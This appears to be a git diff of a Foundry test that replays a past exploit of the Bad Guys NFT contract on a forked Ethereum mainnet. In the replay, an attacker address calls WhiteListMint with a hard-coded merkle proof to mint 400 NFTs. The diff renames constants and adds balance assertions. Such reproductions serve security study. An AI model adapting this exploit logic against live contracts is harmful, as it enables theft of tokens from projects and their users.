@@ -13,15 +13,16 @@ interface IBadGuys {
 contract Exploit_Bad_Guys_NFT is TestHarness {
     
     IBadGuys internal constant nft = IBadGuys(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
-    address internal constant PROJECT_OWNER = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade;
-    address internal constant ATTACKER = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;
-    
+    address internal constant project_owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade;
+    address internal constant attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;
+
+    // TODO: we could improve this scenario by removing `prank(ATTACKER)` and redoing
+    // the logic of constructing a merkle proof for an arbitrary address
     function setUp() external {
         cheat.createSelectFork("mainnet", 15460093); // One before the mint
 
-        cheat.prank(PROJECT_OWNER);
+        cheat.prank(project_owner);
         nft.flipPauseMinting();
-
     }
 
     function test_attack() external {
@@ -44,10 +45,14 @@ contract Exploit_Bad_Guys_NFT is TestHarness {
         merkleProof[14] = 0xce5c61c22a5d840c02b32aaebf73c9bc3c3d71c49f22b22c4f3cae4aa1fd557b;
 
         emit log_string("Attacker balance");
-        emit log_named_decimal_uint("Before mint", nft.balanceOf(ATTACKER),0);
-        cheat.prank(ATTACKER);
+        emit log_named_decimal_uint("Before mint", nft.balanceOf(attacker),0);
+        uint256 nftsBefore = nft.balanceOf(attacker);
+        cheat.prank(attacker);
         nft.WhiteListMint(merkleProof, 400);
-        emit log_named_decimal_uint("After mint", nft.balanceOf(ATTACKER), 0);
+        uint256 nftsAfter = nft.balanceOf(attacker);
+        emit log_named_decimal_uint("After mint", nft.balanceOf(attacker), 0);
+
+        assertGe(nftsAfter, nftsBefore);
     }        
    
 
